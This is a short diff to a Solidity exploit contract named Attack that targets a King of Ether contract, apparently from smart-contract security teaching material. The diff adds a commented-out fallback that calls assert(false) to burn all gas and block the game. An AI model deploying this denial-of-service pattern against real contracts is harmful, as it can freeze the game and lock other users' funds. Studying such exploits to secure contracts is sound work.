@@ -45,6 +45,14 @@ contract Attack {
         kingOfEther = KingOfEther(_kingOfEther);
     }
 
+    // You can also perform a DOS by consuming all gas using assert.
+    // This attack wil work even if the calling contract does not check
+    // whether the call was successful or not.
+    //
+    // function () external payable {
+    //     assert(false);
+    // }
+
     function attack() public payable {
         kingOfEther.claimThrone.value(msg.value)();
     }
